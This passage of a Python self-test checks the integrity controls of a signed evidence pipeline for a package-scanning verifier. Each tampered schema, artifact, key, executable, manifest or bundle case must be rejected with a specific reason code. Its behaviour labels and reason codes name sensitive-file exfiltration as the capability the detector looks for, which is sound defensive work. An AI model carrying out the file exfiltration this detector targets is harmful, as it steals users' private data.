            sample_id=combined_wheel_id,
            profile_id="wheel-static-v1",
            artifact=artifacts[combined_wheel_id],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=modality_inputs,
            schema=COMBINED_SCHEMA,
        )
        require(
            modality_process.returncode == 20
            and "projection_schema_set_deterministic_modality_required"
            in modality_process.stderr,
            modality_process.stderr,
        )
        checks += 1

        tampered_schema_value = json.loads(COMBINED_SCHEMA.read_text(encoding="utf-8"))
        tampered_schema_value["policies"][0]["behavior_label"] = (
            "sensitive_file_exfiltration"
        )
        tampered_schema_path = root / "tampered-static-projection-schema-set.json"
        tampered_schema_path.write_bytes(canonical(tampered_schema_value))
        policy_tamper_manifest = copy.deepcopy(combined_manifest_value)
        policy_tamper_manifest["verified_evidence_registry"][
            "projection_schema_sha256"
        ] = digest(tampered_schema_path.read_bytes())
        policy_tamper_manifest_path = root / "combined-policy-tamper-manifest.json"
        write_json(policy_tamper_manifest_path, policy_tamper_manifest)
        policy_tamper_manifest_sha256 = digest(policy_tamper_manifest_path.read_bytes())
        policy_tamper_dir = case_directory(root, "combined-policy-tamper")
        policy_tamper_inputs = policy_tamper_dir / "run-inputs.json"
        policy_tamper_inputs.write_bytes(canonical(run_inputs("run-combined-policy-tamper")))
        policy_tamper_process, _ = assemble(
            directory=policy_tamper_dir,
            manifest_path=policy_tamper_manifest_path,
            manifest_sha256=policy_tamper_manifest_sha256,
            sample_id=combined_wheel_id,
            profile_id="wheel-static-v1",
            artifact=artifacts[combined_wheel_id],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=policy_tamper_inputs,
            schema=tampered_schema_path,
        )
        require(
            policy_tamper_process.returncode == 20
            and "projection_schema_descriptor_invalid" in policy_tamper_process.stderr,
            policy_tamper_process.stderr,
        )
        checks += 1

        direct_benign = invoke_verifier(
            artifact=npm_artifacts[npm_benign_id],
            verifier=verifier,
            projection_kind=projection_kind,
        )
        require(direct_benign.returncode == 22, direct_benign.stderr.decode("utf-8"))
        benign_failure = json.loads(direct_benign.stderr)
        require(
            benign_failure["reason_codes"]
            == ["static_projection_sensitive_file_exfiltration_capability_not_found"],
            str(benign_failure),
        )
        require(
            direct_benign.stdout == b"",
            "benign no-finding unexpectedly produced projection metadata",
        )
        checks += 1

        first_sample, first_profile = RUN_SPECS[0]
        base_inputs = run_inputs("run-negative")

        artifact_tamper_dir = case_directory(root, "artifact-tamper")
        tampered_artifact = artifact_tamper_dir / artifacts[first_sample].name
        tampered_artifact.write_bytes(artifacts[first_sample].read_bytes() + b"tamper")
        tamper_inputs = artifact_tamper_dir / "run-inputs.json"
        tamper_inputs.write_bytes(canonical(base_inputs))
        artifact_tamper, _ = assemble(
            directory=artifact_tamper_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=tampered_artifact,
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=tamper_inputs,
        )
        require(
            artifact_tamper.returncode == 20 and "static_verifier_failed_exit_65" in artifact_tamper.stderr,
            artifact_tamper.stderr,
        )
        checks += 1

        slot_dir = case_directory(root, "slot-mismatch")
        slot_inputs = slot_dir / "run-inputs.json"
        slot_inputs.write_bytes(canonical(base_inputs))
        slot_process, _ = assemble(
            directory=slot_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id="unknown-profile",
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=slot_inputs,
        )
        require(
            slot_process.returncode == 20 and "manifest_run_slot_not_unique" in slot_process.stderr,
            slot_process.stderr,
        )
        checks += 1

        timestamp_dir = case_directory(root, "timestamp-order")
        bad_timestamp_inputs = copy.deepcopy(base_inputs)
        bad_timestamp_inputs["verified_at_utc"] = "2026-07-15T00:00:45Z"
        timestamp_inputs = timestamp_dir / "run-inputs.json"
        timestamp_inputs.write_bytes(canonical(bad_timestamp_inputs))
        timestamp_process, _ = assemble(
            directory=timestamp_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=timestamp_inputs,
        )
        require(
            timestamp_process.returncode == 20 and "run_fact_timestamp_order_invalid" in timestamp_process.stderr,
            timestamp_process.stderr,
        )
        checks += 1

        key_dir = case_directory(root, "wrong-signing-key")
        wrong_private, _ = key_pair(key_dir, "wrong")
        key_inputs = key_dir / "run-inputs.json"
        key_inputs.write_bytes(canonical(base_inputs))
        key_process, _ = assemble(
            directory=key_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=wrong_private,
            run_input_path=key_inputs,
        )
        require(
            key_process.returncode == 20 and "bundle_signing_key_mismatch" in key_process.stderr,
            key_process.stderr,
        )
        checks += 1

        executable_dir = case_directory(root, "executable-drift")
        changed_verifier = executable_dir / "whoathere-static-projection"
        changed_verifier.write_bytes(verifier.read_bytes() + b"drift")
        changed_verifier.chmod(0o755)
        executable_inputs = executable_dir / "run-inputs.json"
        executable_inputs.write_bytes(canonical(base_inputs))
        executable_process, _ = assemble(
            directory=executable_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=changed_verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=executable_inputs,
        )
        require(
            executable_process.returncode == 20
            and "verifier_executable_sha256_pin_mismatch" in executable_process.stderr,
            executable_process.stderr,
        )
        checks += 1

        manifest_digest_dir = case_directory(root, "manifest-digest-drift")
        manifest_digest_inputs = manifest_digest_dir / "run-inputs.json"
        manifest_digest_inputs.write_bytes(canonical(base_inputs))
        manifest_digest_process, _ = assemble(
            directory=manifest_digest_dir,
            manifest_path=manifest_path,
            manifest_sha256="sha256:" + "0" * 64,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=manifest_digest_inputs,
        )
        require(
            manifest_digest_process.returncode == 20
            and "evaluation_manifest_digest_mismatch" in manifest_digest_process.stderr,
            manifest_digest_process.stderr,
        )
        checks += 1

        bundle_tamper_dir = case_directory(root, "bundle-tamper")
        original_bundle = json.loads(assembled[first_sample]["bundle"].read_text(encoding="utf-8"))
        original_bundle["run_fact"]["run_id"] = "tampered-run-id"
        tampered_bundle = bundle_tamper_dir / "bundle.json"
        tampered_bundle.write_bytes(canonical(original_bundle))
        publisher_out = bundle_tamper_dir / "run-result.json"
        publisher_process = subprocess.run(
            [
                "python3",
                "-B",
                str(PUBLISHER),
                "--evaluation-manifest",
                str(manifest_path),
                "--expected-evaluation-manifest-sha256",
                manifest_sha256,
                "--sample-id",
                first_sample,
                "--profile-id",
                first_profile,
                "--verified-projection-bundle",
                str(tampered_bundle),
                "--verified-projection-signature",
                str(assembled[first_sample]["signature"]),
                "--verifier-public-key",
                str(public_key),
                "--out",
                str(publisher_out),
            ],
            cwd=ROOT,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        require(
            publisher_process.returncode == 20 and "projection_signature_invalid" in publisher_process.stderr,
            publisher_process.stderr,
        )
        checks += 1

    print(f"static projection bundle assembler self-test passed ({checks} checks)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
